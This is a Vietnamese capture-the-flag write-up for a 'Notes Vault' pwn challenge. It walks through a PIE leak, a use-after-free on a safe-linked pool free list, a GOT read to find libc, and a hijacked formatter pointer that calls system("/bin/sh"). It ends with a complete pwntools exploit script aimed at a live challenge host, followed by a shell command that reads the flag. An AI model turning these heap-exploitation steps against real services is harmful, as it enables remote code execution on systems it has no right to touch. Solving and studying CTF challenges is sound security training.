# PWN#003 — UAF trên pool allocator có safe-linking

**Flag:** CTF{0b1578aa1b39f4c6ab9a857a657ee71aKABO....!}  
**Service:** nc 169.58.126.107 5002  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|

## Đề bài

> Lấy shell trên host từ xa và đọc flag.

Service là menu “Notes Vault” nhỏ: thêm, giải phóng, sửa và xem tối đa 8 note. Mỗi kết nối bắt đầu bằng banner làm lộ một địa chỉ:

```text
=== Notes Vault ===
[debug] build id: 0x55ebac004af8
1) Add  2) Free  3) Edit  4) View  5) Exit
>
```

Handout là binary x86-64 PIE chưa strip, có pool allocator viết tay cho nội dung note. Container chạy binary dưới quyền nobody từ thư mục /challenge; flag nằm ở /flag/flag.txt.

## Phân tích

### Bảo vệ và layout

readelf -d cho thấy BIND_NOW cùng FLAGS_1: NOW PIE, tức binary dùng PIE và Full RELRO; size_to_class lưu fs:0x28 vào stack frame nên có stack canary. NX bật. Không có seccomp filter — system() trong exploit chạy /bin/sh và các coreutils thông thường mà syscall nào cũng được cho phép.

Binary giữ state trong .bss, nên chỉ cần một arbitrary write là có thể tác động toàn bộ cấu trúc:

| Symbol | Address | Vai trò |
|---|---|---|
| class_sizes | 0x2010 | 0x20, 0x40, 0x80 — ba pool size class |
| notes | 0x4060 | Mảng 8 con trỏ note |
| pool | 0x40a0 | Địa chỉ đầu arena |
| pool_cursor | 0x40a8 | Bump pointer của arena |
| freelist | 0x40b0 | Head free list theo từng class |
| notes_storage | 0x40e0 | 8 note struct, mỗi struct 24 byte (0x40e0 + 0xc0 = _end = 0x41a0) |

Mỗi note struct gồm ba qword. Thứ tự dưới đây là giả định mà payload exploit dùng, đồng thời được xác nhận từ byte leak của process live ('C'*8, sau đó là content pointer, size và default_formatter):

| Offset | Field |
|---:|---|
| 0x00 | formatter — function pointer được view_note gọi |
| 0x08 | ptr — content buffer |
| 0x10 | size — chiều dài dùng cho edit/view |

### Leak PIE miễn phí

Trước prompt đầu tiên, main gọi printf("[debug] build id: %p\n", &main), nên PIE slide được lộ trực tiếp:

```text
base = 0x55ebac004af8 - 0x1af8 = 0x55ebac003000
```

main ở 0x1af8, default_formatter ở 0x1512, notes_storage ở 0x40e0; đều tính được trực tiếp từ leak.

### UAF

free_note gọi content_free() trên content buffer nhưng không ghi NULL lại vào notes[idx]. Slot vẫn trỏ tới chunk đã free, còn edit/view tiếp tục dùng ptr/size cũ. Đây là use-after-free trên chunk class 0x20, cũng là bug duy nhất cần khai thác.

### view_note gọi rdx

view_note nạp note struct, chuyển note->formatter vào rdx, note->ptr vào rdi, rồi gọi gián tiếp call rdx — callback kiểu default_formatter vốn in buffer. Kiểm soát một note struct đồng nghĩa kiểm soát cả control flow (rdx) lẫn argument đầu tiên (rdi). Đặt formatter = system và ptr = "/bin/sh" thì view thực hiện system("/bin/sh").

### Pool allocator và leak oracle

palloc cấp phát yêu cầu 0x20/0x40/0x80 từ free list theo class; khi hết chunk, nó dùng arena duy nhất được theo dõi bằng pool/pool_cursor. pfree đưa chunk về đầu list class tương ứng và ghi safe-linked next pointer vào qword đầu chunk:

```text
mangle(next, chunk) = next ^ rol(chunk, 13)
```

Khi list rỗng, next là NULL và qword ghi tại offset 0 của chunk vừa free chỉ còn rol(chunk, 13). Vì slot vẫn trỏ vào chunk đó, view đọc lại mangled word; chỉ cần một phép ror là suy ra địa chỉ chunk — leak heap/pool miễn phí:

```text
raw = 0000020643ebba0a0000...   ->  ror(raw, 13) = 0x55d75a183010
```

## Lời giải

### 1. Leak PIE base

Parse banner (connect() trong script): base = leaked_main - 0x1af8.

### 2. Leak một pool chunk

Gọi add(0, 0x20), rồi free(0), rồi view(0): qword đầu chunk đã free bằng rol(P0, 13). P0 = ror(value, 13) căn chỉnh 16 byte (giá trị quan sát được 0x55d75a183010).

### 3. Trỏ free list vào .bss (mẹo hai lần add)

edit(0, p64(slot0 ^ rol(P0, 13))) ghi đè free-list link thông qua UAF, khiến head thành slot0 = base + 0x40e0 (&notes_storage[0]).

Note struct nằm trong .bss, nên mỗi add chỉ lấy một chunk class 0x20 cho content. Chỉ cần hai lần add:

```python
add(io, 1, 0x20, b'/bin/sh\x00')   # pops P0, installs head = &notes_storage[0]
add(io, 2, 0x20, <32 bytes>)       # pops &notes_storage[0]; read() writes into slot 0's struct
```

32 byte lần add thứ hai là p64(default_formatter) + p64(&notes_storage[1]) + p64(0x40) + b'C'*8, nên slot 0 được dựng lại thành {default_formatter, &notes_storage[1], 0x40}. Slot 0 giờ hoạt động như editor cho slot 1: edit(0) ghi 0x40 byte vào &notes_storage[1], còn view(0) in struct của slot 1.

8 byte 'C'*8 cuối cùng ghi đè formatter của slot 1 bằng CCCCCCCC; leak slot 1 xác nhận layout:

```text
4343434343434343 10a09705b2550000 2000000000000000 127571dfb1550000
'C' * 8          P0               0x20             default_formatter
```

### 4. Arbitrary read/write

set_slot1 ghi {default_formatter, addr, 0x40, 40 filler} vào struct slot 1; view(1) sau đó trả 0x20 byte từ địa chỉ tùy chọn. Primitive ghi tương tự có thể đặt giá trị bất kỳ vào formatter/ptr của slot 1.

### 5. Lấy libc base từ GOT

free@GOT ở 0x3f88. Đọc địa chỉ này được free = libc + 0xa6240:

```text
free = 0x7f77c2720240  libc_base = 0x7f77c267a000
```

Bộ symbol đầy đủ (free/puts/write/printf/read/strtol/malloc/exit/setvbuf/__libc_start_main/__stack_chk_fail) chỉ khớp một entry trên libc.rip:

```json
{ "id": "libc6_2.42-13_amd64",
  "md5": "30fb6243b858286a539e86a67bf48cfa",
  "sha256": "60e497ccae98697a7aa6299c2c1cc4c248a6fb901341d1a2ac0da6f7485e2f27",
  "symbols": { "system": "0x54790", "str_bin_sh": "0x1aaea4", "free": "0xa6240" } }
```

md5sum /challenge/libc.so.6 trên target trả cùng 30fb6243b858286a539e86a67bf48cfa, nên offset là chính xác. Không cần lấy /bin/sh từ libc — chuỗi đã được đặt trong pool chunk P0 ở Bước 3.

### 6. Biến slot 1 thành system("/bin/sh")

set_slot1(io, base, libc_base + 0x54790, P0) đặt slot 1 thành {system, P0, 0x40}. view(1) gọi rdx với rdi = P0, tức system("/bin/sh"). Toàn bộ chain phải chạy trong cùng một kết nối vì PIE và libc slide thay đổi mỗi lần kết nối.

## Mã khai thác

```python
#!/usr/bin/env python3
# PWN#003 -- Africa battleCTF 2026 Qualifier
# notes: free PIE leak -> UAF on the safe-linked pool freelist -> .bss note struct
#        -> arbitrary read of .got -> slot 1 = {system, "/bin/sh"}
import time
from pwn import *

HOST, PORT = '169.58.126.107', 5002

OFF_MAIN = 0x1af8
OFF_DEFAULT_FORMATTER = 0x1512
NOTES_STORAGE = 0x40e0
GOT = 0x3f70
FREELIST = 0x40b0
FREE_OFF = 0xa6240
SYSTEM_OFF = 0x54790          # libc6_2.42-13_amd64 (unique libc.rip match)

MASK = (1 << 64) - 1


def rol(v, n):
    v &= MASK
    return ((v << n) | (v >> (64 - n))) & MASK


def ror(v, n):
    return rol(v, 64 - n)


def connect():
    io = remote(HOST, PORT, timeout=20)
    io.recvuntil(b'build id: 0x')
    main_addr = int(io.recvuntil(b'\n', drop=True), 16)
    base = main_addr - OFF_MAIN
    return io, base


def menu(io, c):
    io.recvuntil(b'> ')
    io.sendline(str(c).encode())


def add(io, idx, size, content):
    menu(io, 1)
    io.recvuntil(b'Index (0-7): ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content: ')
    io.send(content)
    return io.recvuntil(b'.')


def free_(io, idx):
    menu(io, 2)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    return io.recvuntil(b'.')


def edit(io, idx, data):
    menu(io, 3)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content: ')
    io.send(data)
    return io.recvuntil(b'.')


def view(io, idx, n=0x20):
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Note: ')
    return io.recvn(n)


def leak_pool(io, base):
    add(io, 0, 0x20, b'A' * 8)
    free_(io, 0)
    raw = view(io, 0)
    val = u64(raw[:8])
    return ror(val, 13), raw


def slot(base, i):
    return base + NOTES_STORAGE + 24 * i


def set_slot1(io, base, formatter, ptr, size=0x40, pad=8):
    edit(io, 0, p64(formatter) + p64(ptr) + p64(size) + b'C' * pad)


def arb_read(io, base, addr):
    set_slot1(io, base, base + OFF_DEFAULT_FORMATTER, addr, pad=40)
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(b'1')
    io.recvuntil(b'Note: ')
    return io.recvn(0x20, timeout=10)


def run(io, cmds, wait=1.2):
    for c in cmds:
        io.sendline(c.encode() if isinstance(c, str) else c)
    time.sleep(wait)
    out = b''
    try:
        while True:
            b = io.recv(timeout=2)
            if not b:
                break
            out += b
    except Exception:
        pass
    return out.decode('latin1')


def fresh(cmds):
    io, base = connect()
    add(io, 0, 0x20, b'X' * 8)
    free_(io, 0)
    P0 = ror(u64(view(io, 0)[:8]), 13)
    edit(io, 0, p64(slot(base, 0) ^ rol(P0, 13)))
    add(io, 1, 0x20, b'/bin/sh\x00')
    add(io, 2, 0x20, p64(base + OFF_DEFAULT_FORMATTER) + p64(slot(base, 1)) + p64(0x40) + b'C' * 8)
    free_addr = u64(arb_read(io, base, base + 0x3f88)[:8])
    libc_base = free_addr - FREE_OFF
    set_slot1(io, base, libc_base + SYSTEM_OFF, P0)
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(b'1')
    io.recv(timeout=3)
    return io


if __name__ == '__main__':
    io = fresh([])
    print(run(io, ['cat /flag/flag.txt'], wait=1.5))
    io.close()
```

## Ghi chú

* Mọi bước phải nằm trong cùng một kết nối. PIE base và libc base đều đổi theo từng kết nối, nên leak từ session trước không dùng được ở session sau.
* Chỉ dùng ba trong tám slot (0, 1, 2). Lệnh edit 0x40 byte của slot 0 ghi tràn qua slot 1 tới notes_storage[2] và [3]; hai slot này không dùng nên phần ghi đè ngoài ý muốn không ảnh hưởng.
* 8 byte filler cuối payload add(2) rơi lên formatter của slot 1, biến nó thành CCCCCCCC. Vì vậy view(0) bắt đầu bằng tám byte 0x43, và set_slot1 cần ghi lại formatter mỗi lần.
* remote trong pwntools không có method .sleep(); helper dùng time.sleep().
* Container cũng export flag trong environment dưới tên FLAG; /flag là tmpfs mount. File /flag/flag.txt đọc được dưới quyền nobody, không cần nâng quyền.
* Binary trong container tại /challenge/notes dài 21.864 byte, còn handout dùng để phân tích dài 17.064 byte. Mọi offset trong bài (0x1af8, 0x40e0, 0x3f88, stride struct 24 byte) lấy từ handout và đều khớp service live.
* libc là Debian glibc 2.42-13: free = libc + 0xa6240, system = libc + 0x54790, __libc_start_main = libc + 0x29fa0. Dùng glibc máy host có layout main_arena khác sẽ làm sai offset free@GOT.
